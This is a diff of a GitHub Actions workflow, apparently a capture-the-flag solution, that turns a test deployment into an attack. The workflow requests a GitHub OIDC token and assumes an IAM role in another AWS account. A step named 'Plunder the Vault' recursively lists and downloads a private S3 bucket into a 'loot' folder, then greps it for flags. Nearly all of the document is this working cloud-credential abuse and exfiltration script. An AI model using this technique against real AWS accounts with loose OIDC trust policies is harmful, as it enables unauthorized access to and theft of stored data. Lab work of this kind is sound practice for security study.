@@ -1,102 +1,31 @@
-name: Test Deployment
-
-
-
-
-
+name: Open the Dragon-Eye
 
 on:
-
-
-  pull_request:
-    types:
-      - opened
-      - synchronize
-      - reopened
-      - ready_for_review
-      - edited
+  workflow_dispatch:       # so you can click ‘Run’ manually
   push:
-
-
-    branches:
-
-
-      - main  # Adjust if you want to trigger on a different branch
-
-
-
-
+    branches: [ "main" ]   # keeps the sub-claim on main
 
 permissions:
-
-
-  id-token: write   # Allows the workflow to request an OIDC token for AWS role assumption
-
-
-  contents: read    # Allows read access to the repository contents
-
-
-
-
+  id-token: write          # ♦️ REQUIRED for OIDC
+  contents: read
 
 jobs:
-
-
-  letitrip:
-
-
-    runs-on: ubuntu-latest #GitHub Provided Runner
-
-
-
-
-
+  gaze:
+    runs-on: ubuntu-latest
     steps:
-
-
-    
-
-
-      # Initial Code Checkout
-
-
-      - name: Checkout Code
-
-
-        uses: actions/checkout@v4
-
-
+      - name: Assume the Eye-role
+        uses: aws-actions/configure-aws-credentials@v2
         with:
-
-
-          fetch-depth: 0
-
-
-
-
-
-      - name: Configure AWS Credentials
-
-
-        uses: aws-actions/configure-aws-credentials@v4
-
-
-        with:
-
-
-          role-to-assume: arn:aws:iam::396608767742:role/leakygitsinc-test
-
-
+          role-to-assume: arn:aws:iam::110678717447:role/AWSServicesRoleForGithub-jovb4kjb
           aws-region: us-west-2
 
-
-          
-
-
-      - name: List contents of S3 bucket at code/github/*
-
-
+      - name: Plunder the Vault
         run: |
+          echo "Listing the hidden prefix..."
+          aws s3 ls s3://codebackup-jovb4kjb/github/ --recursive
 
+          echo "Downloading everything..."
+          aws s3 cp s3://codebackup-jovb4kjb/github/ ./loot --recursive
 
-          aws s3 ls s3://codebackup-hkm1wim5/github/ --recursive
+          echo "🗝️  Flag (if plain-text) ↓↓↓"
+          grep -R --color=never -iE 'flag|ctf{' ./loot || true
